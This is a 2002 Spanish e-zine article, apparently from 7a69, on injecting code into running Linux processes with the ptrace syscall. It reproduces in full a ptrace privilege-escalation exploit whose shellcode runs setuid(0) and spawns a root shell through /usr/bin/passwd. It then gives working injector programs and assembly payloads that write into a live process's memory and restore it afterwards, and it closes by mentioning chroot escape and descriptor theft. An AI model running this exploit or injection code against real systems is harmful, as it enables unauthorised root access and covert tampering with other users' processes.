@@ -1,0 +1,596 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#14 ]                                                  [ 21-10-2002 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 4 - Inyeccion de codigo en tiempo de ejecucion.               }{ Ripe }
+   |-----------------------------------------------------------------------|
+
+
+0.- Indice.
+-----------
+
+		0.- Indice.
+		1.- Introduccion.
+		2.- La syscall ptrace.
+		3.- Insertando codigo.
+			3.1.- ptrace exploit.
+			3.2.- Insercion sencilla.
+			3.3.- Insercion compleja.
+		4.- Conclusiones.
+
+			
+
+
+1.- Introduccion.
+-----------------
+
+	Lo que en este articulo voy a contar es algo que no he visto
+documentado en ningun lugar, posiblemente porque la utilidad de la inyeccion 
+de codigo usando ptrace sea practicamente nula, unicamente la he visto usarse
+en el exploit que aparecio hace unos mese que explotaba precisamente el ptrace
+de los kernel de linux. Pese a su poca utilidad me he dedicado a investigar un
+poco sobre el tema, y estos, sin ser demasiado brillantes, son los resultados.
+
+
+
+2.- La syscall ptrace.
+----------------------
+
+	Esta syscall permite que un proceso padre tenga acceso, mediante 
+mecanismos ptrace, a todo tipo de datos sobre un proceso hijo que ha 
+solicitado ser traceado. Ptrace (o process trace) fue ideada para ser usada
+por los debuggers del sistema, sin embargo es posible darle mas usos, como
+por ejemplo este que presentamos aqui. No voy a detallar el uso de ptrace,
+para eso ya estan las paginas man, asi pues sera recomendable leer la man
+ptrace(2) antes de seguir con este documento.
+
+
+
+3.- Insertando codigo.
+----------------------
+
+
+
+	3.1.- ptrace exploit.
+	---------------------
+
+	Vamos a ver un poco por encima el exploit que se sirve de ptrace para
+ganar privilegios en un sistema.
+
+
+---/ epcs2.c /---
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <linux/user.h>
+#include <sys/wait.h>
+#include <limits.h>
+#include <errno.h>
+#include <stdlib.h>
+#define CS_SIGNAL SIGUSR1
+#define VICTIM "/usr/bin/passwd"
+#define SHELL "/bin/sh"
+/*
+ * modified simple shell code with some trickery (hand tweaks)
+ */
+char shellcode[]=
+   "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+   "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */
+   "\x31\xc0\xb0\x2e\xcd\x80"
+   "\x31\xc0\x50\xeb\x17\x8b\x1c\x24" /* execve(SHELL) */
+   "\x90\x90\x90\x89\xe1\x8d\x54\x24" /* lets be tricky */
+   "\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
+   "\xc3\x40\xcd\x80\xe8\xe4\xff\xff"
+   "\xff" SHELL "\x00\x00\x00" ; /* pad me */
+
+volatile int cs_detector=0;
+
+void cs_sig_handler(int sig)
+{
+  cs_detector=1;
+}
+
+void do_victim(char * filename)
+{
+  while (!cs_detector) ;
+  kill(getppid(), CS_SIGNAL);
+  execl(filename, filename, NULL);
+  perror("execl");
+  exit(-1);
+}
+
+int check_execve(pid_t victim, char * filename)
+{
+  char path[PATH_MAX+1];
+  char link[PATH_MAX+1];
+  int res;
+
+  snprintf(path, sizeof(path), "/proc/%i/exe", (int)victim);
+  if (readlink(path, link, sizeof(link)-1)<0) {
+    perror("readlink");
+    return -1;
+  }
+
+  link[sizeof(link)-1]='\0';
+  res=!strcmp(link, filename);
+  if (res) fprintf(stderr, "child slept outside of execve\n");
+  return res;
+}
+
+int main(int argc, char * argv[])
+{
+  char * filename=VICTIM;
+  pid_t victim;
+  int error, i;
+  struct user_regs_struct regs;
+
+  /* take our command args if you wanna play with other progs */
+  if (argc>1) filename=argv[1];
+
+  signal(CS_SIGNAL, cs_sig_handler);
+
+  victim=fork();
+  if (victim<0) {
+    perror("fork: victim");
+    exit(-1);
+  }
+  if (victim==0) do_victim(filename);
+
+  kill(victim, CS_SIGNAL);
+  while (!cs_detector) ;
+
+  if (ptrace(PTRACE_ATTACH, victim)) {
+    perror("ptrace: PTRACE_ATTACH");
+    goto exit;
+  }
+  (void)waitpid(victim, NULL, WUNTRACED);
+  if (ptrace(PTRACE_CONT, victim, 0, 0)) {
+    perror("ptrace: PTRACE_CONT");
+    goto exit;
+  }
+
+  (void)waitpid(victim, NULL, WUNTRACED);
+
+  if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
+    perror("ptrace: PTRACE_GETREGS");
+    goto exit;
+  }
+
+  /* make sure that last null is in there */
+  for (i=0; i<=strlen(shellcode); i+=4) {
+    if (ptrace(PTRACE_POKETEXT, victim, regs.eip+i,
+      *(int*)(shellcode+i))) {
+      perror("ptrace: PTRACE_POKETEXT");
+      goto exit;
+    }
+  }
+
+  if (ptrace(PTRACE_SETREGS, victim, 0, &regs)) {
+    perror("ptrace: PTRACE_SETREGS");
+    goto exit;
+  }
+
+  fprintf(stderr, "bug exploited successfully.\nenjoy!\n");
+
+  if (ptrace(PTRACE_DETACH, victim, 0, 0)) {
+    perror("ptrace: PTRACE_DETACH");
+    goto exit;
+  }
+
+  (void)waitpid(victim, NULL, 0);
+  return 0;
+
+exit:
+  fprintf(stderr, "d0h! error!\n");
+  kill(victim, SIGKILL);
+  return -1;
+}
+
+---/ epcs2.c /---
+
+	
+	Ahora nos vamos a centrar unicamente en la forma con la que el exploit 
+logra la ejecucion de la shellcode, que es, precisamente realizando una 
+inyeccion de codigo.
+
+	ptrace(PTRACE_ATTACH, victim)
+
+	Con esta linea, el exploit toma el control del proceso que ha lanzado
+anteriormente, esta es la forma con la que un debugger atachea un proceso (en
+estos momentos el proceso atacheado se para).
+
+	ptrace(PTRACE_GETREGS, victim, 0, &regs)
+
+	Se extra el valor de los registros. Realmente el unico registro que
+interesa es eip, pues sera ahi donde insertaremos nuestro codigo.
+
+  	for (i=0; i<=strlen(shellcode); i+=4) {
+      	  if (ptrace(PTRACE_POKETEXT, victim, regs.eip+i,
+          *(int*)(shellcode+i))) {
+	    perror("ptrace: PTRACE_POKETEXT");
+	    goto exit;
+	  }
+	}
+
+	Seguidamente copia la shellcode, que sera ejecutada cuando el programa
+atacheado continue su ejecucion.
+
+	ptrace(PTRACE_DETACH, victim, 0, 0)
+
+	Con esta instruccion se detachea el proceso dejando que cabalgue 
+libremente la shellcode por la CPU :)
+
+
+
+	3.2.- Insercion sencilla.
+	-------------------------
+
+	Vamos a realizar una prueba sencilla de inyeccion de codigo para ver
+los problemas que se nos plantean. Crearemos un proceso que imprima "Hola"
+continuamente en pantalla y le inyectamos codigo para que imprima "Adios".
+
+
+---/ shit.c /---
+
+#include <stdio.h>
+
+int main() {
+	while(1) {
+		printf("Hola\n");
+		sleep(2);
+	}
+}
+
+---/ shit.c /---
+
+
+	Para insertar codigo, nos serviremos de la syscall ptrace, usandola
+de forma similar al exploit que hemos visto anteriormente.
+
+
+---/ ptrace_inject.c /---
+
+#include <stdio.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+
+#ifndef INJECTED_LEN
+#define INJECTED_LEN    0x00
+#endif /* INJECTED_LEN */
+
+void injected_code();
+
+int main(int argc, char **argv) {
+        int pid;
+        int i;
+        struct user_regs_struct regs;
+        if (argc<2) {
+                printf("Uso:\n");
+                printf("\t%s <pid>\n", argv[0]);
+                exit(0);
+        }
+        pid=atoi(argv[1]);
+	/*
+	 * Atacheamos el proceso. You 0wnz m3!
+	 */
+        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)!=-1) {
+                printf("[1] - Proceso atacheado\n");
+		/*
+		 * Le extraemos los registros con la intencion de saber que posicion de la
+		 * memoria se esta ejecutando (registro eip).
+		 */
+                if (ptrace(PTRACE_GETREGS, pid, NULL, &regs)!=-1) {
+                        printf("[2] - Extraido registro eip (0x%.8x)\n", regs.eip);
+			/*
+			 * Copiamos alla donde apunte eip nuestro codigo.
+			 */
+                        for (i=0; i<INJECTED_LEN; i+=4)
+                                ptrace(PTRACE_POKEDATA, pid, regs.eip+i, *(int*)(injected_code+i));
+                        printf("[3] - Codigo insertado\n");
+                }
+		/*
+		 * Detacheamos el proceso traceado. Go!
+		 */
+                ptrace(PTRACE_DETACH, pid, NULL, NULL);
+                printf("[4] - Ejecutando codigo\n");
+        }
+        exit(0);
+}
+
+---/ ptrace_inject.c /---
+
+
+	Como podeis ver el codigo que insertamos es el de la funcion 
+injected_code, que no esta definida en el propio codigo fuente de 
+ptrace_inject.c sino en un fichero aparte que veremos a continuacion. El 
+motivo por el que aparto el codigo insertado es porque necesito las
+posiciones relativas al offset en el que se inserta el codigo, y C no
+nos lo permite hacer, asi que he optado por usar ensamblador.
+
+	Algunos direis que podria haber usado __asm__(), y es cierto, pero
+yo prefiero meterlo en un fichero aparte :)
+
+	El codigo que insertaremos sera el siguiente. Para los que no sepais
+ensamblador os dire que esto no es nada mas que escribir la palabra "Adios" 
+en pantalla y finaliza la ejecucion - write(1, "Adios\n", 6); exit(0);.
+
+
+---/ injected_code.S /---
+
+#define __NR_exit	$1
+#define __NR_write      $4
+
+.globl injected_code
+injected_code:
+        jmp	data
+get_doffset:
+        movl    __NR_write, %eax
+        movl    $1, %ebx             
+        popl    %ecx                 
+        movl    $6, %edx             
+        int     $0x80                 /* write(1, "Adios\n", 6); */     
+exit:
+	movl	__NR_exit, %eax
+	xorl	%ebx, %ebx
+	int	$0x80                 /* exit(0);
+
+data:
+        call 	get_doffset
+        .string "Adios\n"
+
+---/ injected_code.S /---
+
+
+	Ahora creamos los dos binarios ejecutables de la siguiente manera.
+
+
+	barracuda ~$ gcc shit.c -o shit
+	barracuda ~$ gcc ptrace_inject.c -c -DINJECTED_LEN=0x38
+	barracuda ~$ gcc injected_code.S -c
+	barracuda ~$ gcc ptrace_inject.o injected_code.o -o ptrace_inject
+
+
+	Para probarlo ejecutamos 'shit' en un terminal y 'ptrace_inject' 
+(pasandole el pid del otro proceso como parametro) en otro terminal. Tras eso
+veremos algo similar a esto.
+
+	En el terminal 1:
+
+
+	barracuda ~$ ./shit
+	Hola
+	Hola
+	Hola
+	Hola
+	Adios
+	barracuda ~$
+
+	
+	En el terminal 2:
+
+	
+	barracuda ~$ ./ptrace_inject 26290
+	[1] - Proceso atacheado
+	[2] - Extraido registro eip (0x400bcdc1)
+	[3] - Codigo insertado
+	[4] - Ejecutando codigo
+	barracuda ~$
+
+
+	Esta claro, hemos logrado la insercion de codigo en el proceso 'shit'.
+
+	Una cosa que debemos destacar es que el proceso al que hemos insertado
+codigo ha finalizado. Ello puede no molestarnos, pero es posible que nos interese
+que la ejecucion del proceso continue normalmente. Lo que seguidamente vamos a
+intentar va ser, la insercion de codigo sin obstaculizar la ejecucion del 
+codigo original.
+
+
+
+	3.- Insercion compleja.
+	-----------------------
+
+	La insercion de nuestro codigo en el proceso provoca un cambio en el
+comportamiento del mismo, lo que normalmente acaba con su finalizacion. En
+ocasiones es posible que no queramos que esto ocurra, y nuestra intencion es
+que el programa original transcurra normalmente. Si bien esto puede parecer
+complicado es realmente sencillo, simplemente tenemos que procurar dejar el
+proceso tal y como estaba antes de que metiesemos la zarpa.
+
+	Para lograr esto, lo mejor sera crear un proceso hijo que se encargue
+de ejecutar nuestro codigo inyectado y restaurar el padre para que no se vea
+alterado. Restaurar el valor de los registros del procesador es muy sencillo,
+la propia syscall ptrace proporciona una funcionalidad para setear registros,
+para restaurar el codigo deberemos guardar antes una copia del codigo original.
+
+	Crearemos el proceso hijo en nuestro codigo insertado usando la 
+syscall fork, para que el proceso hijo ejecute lo que nosotros queramos, y
+el proceso padre genere una interrupcion 3, lo que cedera de nuevo el control
+a nuestro inyector, que restaurara el proceso y lo dejara ejecutando 
+normalmente antes de detachearlo.
+
+
+---/ ptrace_inject2.c /---
+
+#include <stdio.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+
+#ifndef INJECTED_LEN
+#define INJECTED_LEN   	0x00 
+#endif /* INJECTED_LEN */
+
+void injected_code();
+
+int main(int argc, char **argv) {
+        int pid;
+        int i;
+	long int *hola;
+        struct user_regs_struct regs;
+        char original_code[INJECTED_LEN]; /* Aqui se guardara el codigo original */
+        if (argc<2) {
+                printf("Uso:\n");
+                printf("\t%s <pid>\n", argv[0]);
+                exit(0);
+        }
+        pid=atoi(argv[1]);
+        /*
+         * Traceamos el proceso en cuestion.
+         */
+        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)!=-1) {
+                printf("[1] - Proceso atacheado\n");
+                /*
+                 * Extraemos los registros.
+                 */
+                if (ptrace(PTRACE_GETREGS, pid, NULL, &regs)!=-1) {
+                        printf("[2] - Extraido registro eip (0x%.8x)\n", regs.eip);
+                        /*
+                         * Insertamos nuestro codigo guardando una copia del original.
+                         */
+                        for (i=0; i<INJECTED_LEN; i+=4) {
+				hola=(long int *)&original_code[i];
+                                *hola=ptrace(PTRACE_PEEKDATA, pid, regs.eip+i, NULL);
+                                ptrace(PTRACE_POKEDATA, pid, regs.eip+i, *(int*)(injected_code+i));
+                        }
+                        printf("[3] - Codigo insertado\n");
+                        /*
+                         * Seguimos la ejecucion del proceso para que se ejecute nuestro
+                         * codigo.
+                         */
+                        ptrace(PTRACE_CONT, pid, 0, 0);
+                        /*
+                         * Esperamos que el proceso nos ceda nuevamente el control (tras generar
+                         * la interrupcion 3).
+                         */
+                        waitpid(pid, NULL, 0);
+                        printf("[4] - Codigo ejecutado\n");
+                        /*
+                         * Copiamos de nuevo el codigo original.
+                         */
+                        for (i=0; i<INJECTED_LEN; i+=4)
+                                ptrace(PTRACE_POKEDATA, pid, regs.eip+i,*(int*)(original_code+i));
+                        printf("[5] - Restaurando codigo original\n");
+                        /*
+                         * Restauramos los registros que habia antes de que tocasemos nada.
+                         */
+                        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+                        printf("[6] - Registros restaurados\n");
+                }
+                /*
+                 * Todo finalizo... Liberamos el proceso atacheado.
+                 */
+                ptrace(PTRACE_DETACH, pid, NULL, NULL);
+                printf("[5] - Detacheado\n");
+        }
+        exit(0);
+}
+
+---/ ptrace_inject2.c /---
+
+	
+	El codigo que insertaremos, que creara un proceso hijo que ejecutara
+el write(0, "Adios\n", 6), es el siguiente.
+
+
+---/ injected_code2.S /---
+
+#define __NR_exit	$1
+#define __NR_fork	$2
+#define __NR_write      $4
+
+.globl injected_code 
+injected_code:
+	movl	__NR_fork, %eax
+	int	$0x80				/* fork() */
+	xorl	%ebx, %ebx
+	cmpl	%eax, %ebx
+	jne	child
+	int	$0x03				/* Cedemos el control al ptrace_inject2.c */
+	/*
+	 * Aqui abajo todo el codigo que queramos insertar en el hijo.
+	 */
+child:
+	jmp 	data	
+get_doffset:
+	movl 	__NR_write, %eax
+	movl 	$1, %ebx
+	popl 	%ecx
+	movl	$6, %edx
+	int 	$0x80				/* write(1, "Adios\n", 6) */
+exit:
+	movl	__NR_exit, %eax
+	xorl	%ebx, %ebx
+	int	$0x80				/* exit(0) */
+data:
+	call 	get_doffset
+	.string	"Adios\n"
+
+---/ injected_code2.S /---
+
+
+	Generamos, una vez mas el binario inyector :)
+
+
+	barracuda ~$ gcc ptrace_inject2.c -c -DINJECTED_LEN=0x45
+	barracuda ~$ gcc injected_code2.S -c
+	barracuda ~$ gcc ptrace_inject2.o injected_code2.o -o ptrace_inject2
+	
+
+	Y lo probamos... En el terminal 1.
+
+
+	barracuda ~$ ./shit
+	Hola
+	Hola
+	Hola
+	Hola
+	Adios
+	Hola
+	Hola
+	...
+
+
+	En el terminal 2.
+
+
+	bash-2.05a$ ./inject 13162
+	[1] - Proceso atacheado
+	[2] - Extraido registro eip (0x400bddc1)
+	[3] - Codigo insertado
+	[4] - Codigo ejecutado
+	[5] - Restaurando codigo original
+	[6] - Registros restaurados
+	[5] - Detacheado
+	bash-2.05a$
+	
+
+
+4.- Conclusiones
+----------------
+
+	El echo de debugear un proceso permite, normalmente, tener un control
+total sobre el mismo. La syscall ptrace fue ideada con la intencion de ofrecer
+a los debuggers una api sencilla para tratar los procesos que debugean, y por 
+ello puede suponer un problema potencial para la seguridad de un computador.
+Muchos expertos en seguridad se han dado cuenta de ello, y estan apareciendo
+numerosos parches de seguridad para distintos sistemas operativos que ofrecen
+la posibilidad de 'capar' dicha syscall o ofrecerla solo a un grupo limitado de
+usuarios.
+
+	Por otro lado, por lo visto en este texto no parece que la inyeccion 
+de codigo tenga utilidad algun, sin embargo nada mas lejos de la realidad, pues
+en ciertas condiciones puede permitir la ruptura de un entorno chroot sin 
+tansiquiere tener privilegios de root en el mismo, 'robar' decriptores de 
+fichero, modificar variables de entorno, alterar las acciones de llamadas a 
+funciones...
+
+
+*EOF*
